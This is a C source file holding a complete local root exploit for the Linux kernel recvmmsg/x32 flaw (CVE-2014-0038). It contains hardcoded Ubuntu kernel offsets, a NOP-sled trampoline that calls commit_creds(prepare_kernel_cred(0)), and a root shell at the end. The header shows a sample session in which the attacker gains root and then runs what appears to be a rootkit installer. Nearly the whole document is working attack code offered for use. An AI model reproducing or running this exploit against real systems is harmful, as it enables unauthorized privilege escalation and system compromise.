/* 
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
recvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)
CVE-2014-0038 / x32 ABI with recvmmsg
by rebel @ irc.smashthestack.org
-----------------------------------

takes about 13 minutes to run because timeout->tv_sec is decremented
once per second and 0xff*3 is 765.

some things you could do while waiting:
  * watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times
  * read https://wiki.ubuntu.com/Security/Features and smirk a few times
  * brew some coffee
  * stare at the countdown giggly with anticipation

could probably whack the high bits of some pointer with nanoseconds,
but that would require a bunch of nulls before the pointer and then
reading an oops from dmesg which isn't that elegant.

&net_sysctl_root.permissions is nice because it has 16 trailing nullbytes

hardcoded offsets because I only saw this on ubuntu & kallsyms is protected
anyway..

same principle will work on 32bit but I didn't really find any major
distros shipping with CONFIG_X86_X32=y

user@ubuntu:~$ uname -a
Linux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu:~$ gcc recvmmsg.c -o recvmmsg
user@ubuntu:~$ ./recvmmsg
byte 3 / 3.. ~0 secs left.     
w00p w00p!
# id
uid=0(root) gid=0(root) groups=0(root)
# sh phalanx-2.6b-x86_64.sh
unpacking..

:)=

greets to my homeboys kaliman, beist, capsl & all of #social

Sat Feb  1 22:15:19 CET 2014
% rebel %
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#define _GNU_SOURCE
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/utsname.h>

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)
#define VLEN 1
#define BUFSIZE 200

int port;

struct offset {
    char *kernel_version;
    unsigned long dest; // net_sysctl_root + 96
    unsigned long original_value; // net_ctl_permissions
    unsigned long prepare_kernel_cred;
    unsigned long commit_creds;
};

struct offset offsets[] = {
    {"3.11.0-15-generic",0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10
    {"3.11.0-12-generic",0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10
    {"3.8.0-19-generic",0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04
    {NULL,0,0,0,0}
};

void udp(int b) {
    int sockfd;
    struct sockaddr_in servaddr,cliaddr;
    int s = 0xff+1;

    if(fork() == 0) {
        while(s > 0) {
            fprintf(stderr,"\rbyte %d / 3.. ~%d secs left    \b\b\b\b",b+1,3*0xff - b*0xff - (0xff+1-s));
            sleep(1);
            s--;
            fprintf(stderr,".");
        }

        sockfd = socket(AF_INET,SOCK_DGRAM,0);
        bzero(&servaddr,sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
        servaddr.sin_port=htons(port);
        sendto(sockfd,"1",1,0,(struct sockaddr *)&servaddr,sizeof(servaddr));
        exit(0);
    }

}

void trigger() {
    open("/proc/sys/net/core/somaxconn",O_RDONLY);

    if(getuid() != 0) {
        fprintf(stderr,"not root, ya blew it!\n");
        exit(-1);
    }

    fprintf(stderr,"w00p w00p!\n");
    system("/bin/sh -i");
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

// thx bliss
static int __attribute__((regparm(3)))
getroot(void *head, void * table)
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}

void __attribute__((regparm(3)))
trampoline()
{
    asm("mov $getroot, %rax; call *%rax;");
}

int main(void)
{
    int sockfd, retval, i;
    struct sockaddr_in sa;
    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char buf[BUFSIZE];
    long mmapped;
    struct utsname u;
    struct offset *off = NULL;

    uname(&u);

    for(i=0;offsets[i].kernel_version != NULL;i++) {
        if(!strcmp(offsets[i].kernel_version,u.release)) {
            off = &offsets[i];
            break;
        }
    }

    if(!off) {
        fprintf(stderr,"no offsets for this kernel version..\n");
        exit(-1);
    }

    mmapped = (off->original_value  & ~(sysconf(_SC_PAGE_SIZE) - 1));
    mmapped &= 0x000000ffffffffff;

        srand(time(NULL));
    port = (rand() % 30000)+1500;

    commit_creds = (_commit_creds)off->commit_creds;
    prepare_kernel_cred = (_prepare_kernel_cred)off->prepare_kernel_cred;

    mmapped = (long)mmap((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);

    if(mmapped == -1) {
        perror("mmap()");
        exit(-1);
    }

    memset((char *)mmapped,0x90,sysconf(_SC_PAGE_SIZE)*3);

    memcpy((char *)mmapped + sysconf(_SC_PAGE_SIZE), (char *)&trampoline, 300);

    if(mprotect((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_EXEC) != 0) {
        perror("mprotect()");
        exit(-1);
    }
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(-1);
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(-1);
    }

    memset(msgs, 0, sizeof(msgs));

    iovecs[0].iov_base = &buf;
    iovecs[0].iov_len = BUFSIZE;
    msgs[0].msg_hdr.msg_iov = &iovecs[0];
    msgs[0].msg_hdr.msg_iovlen = 1;

    for(i=0;i < 3 ;i++) {
        udp(i);
        retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)off->dest+7-i);
        if(!retval) {
            fprintf(stderr,"\nrecvmmsg() failed\n");
        }
    }

    close(sockfd); 

    fprintf(stderr,"\n");

    trigger();
}
